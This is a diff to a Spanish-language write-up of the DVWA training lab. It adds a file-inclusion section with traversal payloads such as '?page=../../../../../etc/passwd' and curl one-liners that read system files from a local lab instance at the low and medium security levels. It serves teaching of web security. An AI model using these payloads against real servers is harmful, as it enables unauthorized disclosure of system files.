@@ -11,7 +11,7 @@ DVWA es una aplicación web PHP / MySQL vulnerable que sirve para practicar con 
 1. [Despliegue](https://github.com/sapellaniz/dvwa#despliegue)
 2. [Brute force](https://github.com/sapellaniz/dvwa#brute-force)
 3. [Command injection](https://github.com/sapellaniz/dvwa#command-injection)
-4. [file-inclusion](https://github.com/sapellaniz/dvwa#file-inclusion)
+4. [File-inclusion](https://github.com/sapellaniz/dvwa#file-inclusion)
 
 # Despliegue
 
@@ -105,21 +105,33 @@ Con el nivel de seguridad alto seleccionado, la lista de badchars ha aumentado a
 
 # File Inclusion
 
-(pantallazo)
+![File inclusiom](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-00.png)
 
-La vulnerabilidad de inclusión de archivos permite a un atacante incluir un archivo en la respuesta del servidor. La vulnerabilidad se produce debido al uso de entradas proporcionadas por el usuario sin la validación adecuada. Hay dos variantes: Local File Inclusion (LFI), cuando el archivo incluido pertenece al servidor y Remote File Inclusion (RFI), cuando el archivo pertenece a un servidor remoto, ajeno al servidor vulnerable. En este caso solamente realizaré varios LFI porque este laboratorio no ha sido configurado para permitir RFI.
+La vulnerabilidad de inclusión de archivos permite a un atacante incluir un archivo en la respuesta del servidor. La vulnerabilidad se produce debido al uso de entradas proporcionadas por el usuario sin la validación adecuada. Hay dos variantes: Local File Inclusion (LFI), cuando el archivo incluido pertenece al servidor y Remote File Inclusion (RFI), cuando el archivo pertenece a un servidor remoto, ajeno al servidor vulnerable. En este caso solamente realizaremos varios LFI porque este laboratorio no ha sido configurado para permitir RFI.
 
 ### Security: low
+Cuando se pasan parámetros a una aplicación web, sobre todo mediante el método GET, lo primero que se nos viene a la mente son inyecciones (de código o de comamdos) y LFI/RFI, en este caso ya sabemos de qué se trata.
+
 Con el nivel de seguridad bajo seleccionado, no hay ninguna protección, se puede explotar haciendo directory traversal:
+
 ```
+# Desde el navegador:
 ?page=../../../../../etc/passwd
+
+# Desde la consola:
 file="/etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=../../../../..$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=low" | sed '/DOCTYPE/q' | sed '$ d'
 ```
 
+![File inclusiom](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-01.png)
+
 ### Security: medium
 Con el nivel de seguridad medio seleccionado, hay algunos badchars para RFI y los de LFI son "../" y "..\", pero esto no es una solución eficaz:
+
 ```
+# Desde el navegador:
 ?page=/etc/passwd
+
+# Desde la consola:
 file="/etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=medium" | sed '/DOCTYPE/q' | sed '$ d'
 ```
 
